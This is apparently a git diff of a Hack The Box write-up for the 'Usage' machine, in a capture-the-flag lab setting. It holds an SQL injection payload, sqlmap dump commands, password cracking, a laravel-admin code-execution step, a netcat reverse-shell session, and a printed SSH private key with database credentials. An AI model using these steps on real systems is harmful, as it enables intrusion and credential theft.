@@ -1,6 +1,5 @@
 # ROOM
 Usage from HTB :)
-
 I want to write  this writeup in english this time :)
 
 # Information gathering
@@ -59,7 +58,6 @@ Requests/sec.: 392.6572
 ```
 ## Manual search
 After trying multiple things, i found a field vulnerable to SQL injection in reset password page.
-
 This payload :
 ```
 bleh@bleh.com' AND 1=1;-- -
@@ -112,7 +110,7 @@ sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users --dump
 | 1  | Administrator | <blank> | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
 +----+---------------+---------+---------------------+---------------------+--------------------------------------------------------------+
 ```
-We have the name, the token etc. but no password. We're gonna try to get the password column now
+We have a token. But no password. We're gonna try to get the password column now
 ```
 sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dump
 ```
@@ -124,7 +122,6 @@ sqlmap -r req.txt -p email --batch --dbms=MySQL -T admin_users -C password --dum
 +--------------------------------------------------------------+
 ```
 Finally !
-
 Now, we need to crack it.
 ```
 john --wordlist=/home/kali/Wordlist/rockyou.txt hash  
@@ -140,14 +137,95 @@ whatever1        (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-So, here the admin account :
+So, here the admin account we found:
 ```
 Administrator
 whatever1
 ```
-This account do not work with the login page nor the admin login page...
+This account doesnt work on login page nor admin login page.
+I need to do more search on MySQL.
 
-We must continue our research in MySQL...
+i finally found the right user :
+```
+Admin
+whatever1
+```
+i have now acces to the admin page. 
+We can see the dependencies used:
+```
+php 	^8.1
+encore/laravel-admin 	1.8.18
+guzzlehttp/guzzle 	^7.2
+laravel/framework 	^10.10
+laravel/sanctum 	^3.2
+laravel/tinker 	^2.8
+symfony/filesystem 	^6.3
+```
+After a quick google search, we found an [Arbitrary Code Execution](https://flyd.uk/post/cve-2023-24249/)
+
+Now, we have the shell !
+
+```
+┌──(kali㉿kali)-[~/Challenge/HackTheBox/Usage]
+└─$ nc -lnvp 4444                       
+listening on [any] 4444 ...
+connect to [10.10.14.173] from (UNKNOWN) [10.10.11.18] 56150
+Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 10:19:42 up 9 min,  0 users,  load average: 0.23, 0.28, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1000(dash) gid=1000(dash) groups=1000(dash)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+dash@usage:/$
+```
 # Post exploit
+We found the first flag. Now we need to root the machine !
+You can find the flag here : **/home/dash/user.txt**
 
-**NOT FINISH YET**
+I found an SSH key in **/home/dash**
+```
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+63zj5LQZw2/NvnAAAACmRhc2hAdXNhZ2U=
+-----END OPENSSH PRIVATE KEY-----
+```
+The DB password:
+```
+DB_DATABASE=usage_blog
+DB_USERNAME=staff
+DB_PASSWORD=s3cr3t_c0d3d_1uth
+```
